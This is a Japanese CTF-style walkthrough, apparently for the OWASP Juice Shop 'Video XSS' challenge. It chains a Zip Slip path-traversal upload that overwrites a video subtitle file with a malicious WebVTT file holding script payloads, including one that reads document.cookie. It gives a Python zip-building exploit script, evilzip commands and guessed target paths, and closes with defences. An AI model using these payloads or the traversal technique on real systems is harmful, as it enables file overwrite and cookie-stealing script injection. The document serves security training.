# Video XSS ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** XSS + Zip Slip
**目標:** プロモーション動画に XSS ペイロードを埋め込む

---

## 思考プロセス

**ステップ1: ターゲットを理解**
```
「/promotion ページにプロモ動画がある」
    ↓
「動画は <video> タグで再生」
    ↓
「字幕は WebVTT 形式（.vtt ファイル）」
    ↓
「VTT ファイルを改ざんできれば XSS が可能？」
```

**ステップ2: VTT ファイルの特性**
```
「WebVTT は字幕用のテキスト形式」
    ↓
「ブラウザが VTT を解析してDOMに挿入」
    ↓
「<script> タグを含めたら実行される？」
    ↓
「ただし、直接 VTT をアップロードする機能はない...」
```

**ステップ3: Zip Slip との組み合わせ**
```
「/complain でファイルアップロードができる」
    ↓
「ZIP ファイルをアップロード可能」
    ↓
「ZIP 展開時のパストラバーサル脆弱性」
    ↓
「VTT ファイルを動画の保存先に上書き」
```

## VTT ファイル形式

```
WEBVTT

00:00:00.000 --> 00:00:05.000
通常の字幕テキスト

00:00:05.000 --> 00:00:10.000
ここに XSS ペイロードを挿入
```

## 攻撃用 VTT ファイル

```
WEBVTT

00:00:00.000 --> 00:00:01.000
<script>alert('XSS')</script>

00:00:01.000 --> 00:00:02.000
</script><script>alert(document.cookie)</script>
```

## 実行手順

1. **攻撃用 VTT ファイルを作成**
   ```bash
   cat > owasp_promo.vtt << 'VTTEOF'
   WEBVTT

   00:00:00.000 --> 00:00:10.000
   </script><script>alert('XSS')</script>
   VTTEOF
   ```

2. **Zip Slip ペイロードを作成**
   ```python
   import zipfile
   import os
   
   # 悪意のある VTT ファイル
   vtt_content = '''WEBVTT

   00:00:00.000 --> 00:00:10.000
   </script><script>alert('XSS')</script>
   '''
   
   with open('owasp_promo.vtt', 'w') as f:
       f.write(vtt_content)
   
   # パストラバーサル付き ZIP を作成
   # 実際のパスは環境によって異なる
   target_path = '../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt'
   
   with zipfile.ZipFile('exploit.zip', 'w') as zf:
       zf.write('owasp_promo.vtt', target_path)
   
   print("exploit.zip created!")
   ```

3. **別の方法: evilzip ツールを使用**
   ```bash
   # evilzip インストール
   pip install evilzip
   
   # Zip Slip ペイロード作成
   evilzip owasp_promo.vtt ../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
   ```

4. **ZIP をアップロード**
   - `/#/complain` ページにアクセス
   - 作成した `exploit.zip` をアップロード
   - サーバーが ZIP を展開 → VTT が上書きされる

5. **XSS を確認**
   - `/promotion` ページにアクセス
   - 動画再生時に XSS が発動

## ターゲットパス（推測）

```
# 動画関連ファイルの保存先
frontend/dist/frontend/assets/public/videos/
frontend/src/assets/public/videos/
public/videos/
assets/videos/
```

## 検証ポイント

- [ ] /promotion ページの動画構造を確認
- [ ] VTT ファイルのパスを特定
- [ ] Zip Slip ペイロードを作成
- [ ] アップロード後に XSS 発動を確認

## 対策

- ZIP 展開時のパス検証（../ を拒否）
- VTT ファイルのサニタイズ
- CSP (Content Security Policy) の設定
- アップロードディレクトリを Web ルート外に配置

## 関連チャレンジ

- [Arbitrary File Write](arbitrary-file-write.md) - Zip Slip の基本
- [DOM XSS](../difficulty-1/dom-xss.md) - XSS の基本
- [Deprecated Interface](../difficulty-2/deprecated-interface.md) - ファイルアップロード

## 解説

[未着手]
